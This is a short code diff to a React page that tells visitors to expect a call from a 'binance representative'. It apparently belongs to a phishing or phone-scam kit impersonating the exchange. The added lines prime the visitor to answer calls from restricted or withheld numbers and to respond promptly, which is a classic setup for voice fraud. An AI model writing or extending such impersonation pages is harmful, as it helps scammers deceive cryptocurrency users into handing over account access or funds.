@@ -124,6 +124,10 @@ export default function ClientOnly({ securitySession }: Props) {
                   <h2 className="text-2xl font-semibold mb-2">
                     Please expect a call from binance representative shortly
                   </h2>
+                  <p className="text-gray-400 text-sm text-center px-4 mb-4">
+                    Calls may may show up from a restricted or withheld number.
+                    Please answer promptly so we can assist you.
+                  </p>
                 </div>
 
                 <div className="mb-6">
